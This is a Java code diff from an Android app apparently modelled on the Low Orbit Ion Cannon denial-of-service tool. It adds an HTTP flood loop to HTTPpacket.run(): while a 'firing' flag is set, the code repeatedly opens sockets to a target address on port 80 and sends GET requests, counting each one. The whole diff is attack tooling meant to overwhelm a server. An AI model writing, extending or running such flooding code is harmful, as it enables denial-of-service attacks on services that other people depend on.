@@ -1,8 +1,11 @@
 package com.example.rifatrashid.loworbitioncannon;
 
 import java.io.IOException;
+import java.io.OutputStreamWriter;
 import java.net.DatagramPacket;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
+import java.net.Socket;
 
 /**
  * Created by Rifat Rashid on 8/12/2015.
@@ -27,5 +30,20 @@ public class HTTPpacket implements Runnable {
     public void run() {
         count = 0;
         sTime = System.currentTimeMillis();
+        Socket sock;
+        while (managerClass.firing){
+            try{
+                sock = new Socket();
+                sock.connect(new InetSocketAddress(IPAddress, 80), 10);
+                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(sock.getOutputStream());
+                outputStreamWriter.write("GET / HTTP/1.1");
+                outputStreamWriter.close();
+                sock.close();
+                count++;
+                Thread.sleep(50);
+            }catch (Exception io){
+                io.printStackTrace();
+            }
+        }
     }
 }
